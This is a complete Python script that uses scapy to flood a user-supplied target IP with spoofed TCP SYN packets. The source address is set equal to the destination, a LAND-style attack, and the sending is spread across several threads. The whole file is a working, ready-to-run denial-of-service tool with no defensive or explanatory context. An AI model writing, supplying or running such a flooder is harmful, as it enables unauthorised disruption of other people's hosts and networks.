from scapy.all import IP, TCP, send
import os
import threading

def connection_flood(target_ip, packets_count):
    for _ in range(packets_count):
        try:
            ip_layer = IP(src=target_ip, dst=target_ip)
            tcp_layer = TCP(sport=80, dport=80, flags="S")
            packet = ip_layer / tcp_layer
            send(packet, verbose=0)
        except Exception as e:
            print(f"Error sending packet: {e}")

def main():
    os.system("clear")
    target_ip = input("Target IP address: ")
    packets_count = int(input("How many packets? "))
    thread_count = int(input("How many threads? "))

    if thread_count > packets_count:
        thread_count = packets_count

    packets_per_thread = packets_count // thread_count
    extra_packets = packets_count % thread_count

    threads = []

    for i in range(thread_count):
        thread_packets = packets_per_thread + (1 if i < extra_packets else 0)
        thread = threading.Thread(target=connection_flood, args=(target_ip, thread_packets))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    print("\nTotal packets sent: %i" % packets_count)

if __name__ == "__main__":
    main()
